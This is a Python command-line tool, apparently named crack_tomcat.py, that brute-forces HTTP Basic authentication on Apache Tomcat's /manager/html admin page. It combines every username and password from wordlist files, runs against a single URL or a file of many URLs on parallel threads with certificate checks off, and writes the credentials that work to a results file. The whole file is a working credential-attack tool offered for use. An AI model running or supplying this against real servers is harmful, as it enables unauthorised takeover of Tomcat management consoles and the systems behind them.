#!/usr/bin/python
# -*- coding: utf-8 -*-
# author:Kat

import requests
import base64
import sys
import argparse
import threadpool
from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

logo = '''
 _____             __    ______                    __
 / ___/______ _____/ /__ /_  __/__  __ _  _______ _/ /_
/ /__/ __/ _ `/ __/  '_/  / / / _ \/  ' \/ __/ _ `/ __/
\___/_/  \_,_/\__/_/\_\__/_/  \___/_/_/_/\__/\_,_/\__/
                     /___/by_Kat v1.1
'''

password_base64 = []


def multithreading(funcname, filename="url.txt", pools=5):
    works = []
    with open(filename, "r") as f:
        for i in f:
            func_params = [i.rstrip("\n")]
            works.append((func_params, None))
    pool = threadpool.ThreadPool(pools)
    reqs = threadpool.makeRequests(funcname, works)
    [pool.putRequest(req) for req in reqs]
    pool.wait()


def get_cheek_pass():
    with open("user.txt", "r") as f:
        for name in f:
            # print(name.strip())
            with open("pass.txt", "r", encoding='ISO-8859-1') as f:
                for password in f:
                    # print(password.strip())
                    pass_str = name.strip() + ":" + password.strip()
                    # print(pass_str)
                    base64_str = base64.b64encode(pass_str.encode('utf-8')).decode("utf-8")
                    # print(base64_str)
                    password_base64.append(base64_str)


def cheek_tomcat(url):
    i = 0
    print("[+] startig tomcat cheek --- ---\n")
    con = int(len(password_base64))
    for basic in password_base64:
        i = i + 1
        print("[+] 正在进行第 {} 组密码暴破## 已完成: {:.2f}%".format(i, i / con), end="\r")
        # print(basic)
        headers = {
            "Accept": "application/x-shockwave-flash, image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, */*",
            "User-Agent": "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50",
            "Content-Type": "application/x-www-form-urlencoded",
            'Authorization': 'Basic %s' % basic
        }
        try:
            req = requests.get(url + "/manager/html", headers=headers, timeout=5, verify=False)
            if req.status_code == 404 or req.status_code == 403:
                print("未发现管理后台或后台Access Denied")
                break
            if req.status_code == 200:
                print("[+] status_code:", req.status_code, "tomcat爆破成功:",
                      base64.b64decode(basic.encode("utf-8")).decode("utf-8"))
                # print(headers)
                with open('result.txt', 'a+') as f:
                    f.write(url + '\n')
                    f.write(base64.b64decode(basic.encode("utf-8")).decode("utf-8"))
                    f.write('\n=============\n')
                break
            else:
                pass
        except Exception as e:
            print(e)


if __name__ == "__main__":
    print(logo)
    if (len(sys.argv)) < 2:
        print('Useage: python3 crack_tomcat.py -u url')
        print('Useage: python3 crack_tomcat.py -r url.txt')
    else:
        parser = argparse.ArgumentParser()
        parser.add_argument('-u', help="url -> example http://127.0.0.1", type=str, dest='check_url')
        parser.add_argument('-r', help="url list to file", type=str, dest='check_file')
        args = parser.parse_args()
        if args.check_url:
            get_cheek_pass()
            cheek_tomcat(args.check_url)
        if (args.check_file):
            get_cheek_pass()
            multithreading(cheek_tomcat, args.check_file, 8)
